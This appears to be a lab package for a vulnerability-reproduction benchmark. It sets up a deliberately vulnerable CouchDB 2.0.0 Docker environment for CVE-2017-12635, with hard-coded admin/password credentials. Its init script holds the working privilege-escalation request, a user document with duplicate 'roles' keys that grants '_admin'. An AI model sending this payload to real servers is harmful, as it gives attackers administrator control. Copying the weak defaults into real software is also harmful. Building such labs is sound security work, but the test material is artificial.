{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/docker-compose.yml",
            "content": "services:\n  couchdb:\n    build: .\n    container_name: couchdb_vulnerable\n    ports:\n      - \"5984:5984\"\n    environment:\n      - COUCHDB_USER=admin\n      - COUCHDB_PASSWORD=password\n    volumes:\n      - couchdb_data:/opt/couchdb/data\n\nvolumes:\n  couchdb_data:"
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/Dockerfile",
            "content": "FROM ubuntu:18.04\n\n# Install dependencies\nRUN apt-get update && \\\n    apt-get install -y erlang curl && \\\n    rm -rf /var/lib/apt/lists/*\n\n# Download and install CouchDB 2.0.0\nRUN curl -sSL https://archive.apache.org/dist/couchdb/source/2.0.0/apache-couchdb-2.0.0.tar.gz | tar xz -C /usr/src && \\\n    cd /usr/src/apache-couchdb-2.0.0 && \\\n    ./configure && \\\n    make && \\\n    make install\n\n# Expose CouchDB port\nEXPOSE 5984\n\n# Start CouchDB\nCMD [\"couchdb\"]"
        },
        {
            "location": "./../../dockers/CVE-2017-12635/custom_no_tool/init-couchdb.sh",
            "content": "#!/bin/bash\n\n# Wait for CouchDB to start\nuntil curl -s http://admin:password@localhost:5984/_up; do\n  echo \"Waiting for CouchDB to start...\"\n  sleep 1\ndone\n\n# Create a test database\ncurl -X PUT http://admin:password@localhost:5984/testdb\n\n# Add a test document\ncurl -X POST http://admin:password@localhost:5984/testdb -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"test_document\", \"type\": \"example\"}'\n\n# Create a user with duplicate roles\ncurl -X PUT http://admin:password@localhost:5984/_users/org.couchdb.user:attacker \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"attacker\", \"password\": \"attackerpass\", \"roles\": [\"_admin\"], \"roles\": [], \"type\": \"user\"}'\n\n# Confirmation message\necho \"CouchDB is initialized with test data and a user with duplicate roles.\""
        }
    ],
    "directory_tree": "CVE-2017-12635/\n\u2514\u2500\u2500 custom_no_tool/\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 Dockerfile\n    \u2514\u2500\u2500 init-couchdb.sh"
}